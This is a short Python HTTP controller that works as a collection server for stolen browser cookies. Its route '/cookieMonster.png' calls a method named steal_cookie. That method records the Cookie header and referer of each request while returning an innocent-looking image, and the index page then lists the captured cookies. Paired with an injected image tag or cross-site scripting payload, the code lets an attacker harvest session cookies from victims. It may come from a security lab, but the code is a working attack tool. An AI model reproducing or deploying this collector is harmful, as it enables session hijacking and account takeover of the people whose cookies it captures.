import http.cookies

class Controller:
    def __init__(self, model, view):
        self.model = model
        self.view = view
        self.routes = {
            'GET': {
                '/': self.handle_index,
                '/background.jpg': lambda req: self.send_image(req, 'background.jpg'),
                '/cookieMonster.png': self.steal_cookie,
            }
        }
    
    def handle_request(self, request):
        handler = self.routes.get(request.command, {}).get(request.path)
        if handler is None:
            self.send_error(request, 404, f'The requested URL {request.path} was not found on this server.')
        else:
            handler(request)
        
    def handle_index(self, request):
        request.send_response(200)
        request.send_header('Content-type', 'text/html')
        request.end_headers()
        request.wfile.write(self.view.render_index(self.model.get_cookies()).encode())
    
    def send_image(self, request, filename):
        content_type = 'image/jpeg' if filename.endswith('.jpg') else 'image/png'
        with open(f'images/{filename}', 'rb') as f:
            content = f.read()
        request.send_response(200)
        request.send_header('Content-type', content_type)
        request.send_header('Content-length', len(content))
        request.end_headers()
        request.wfile.write(content)
    
    def steal_cookie(self, request):
        cookies = http.cookies.SimpleCookie(request.headers['Cookie'])
        self.model.store_cookies(cookies.output(header=''), request.headers.get('referer'))
        self.send_image(request, 'cookieMonster.png')

    def send_error(self, request, code, body):
        request.send_response(code)
        request.send_header('Content-type', 'text/html')
        request.end_headers()
        request.wfile.write(self.view.render_error(code, body).encode())
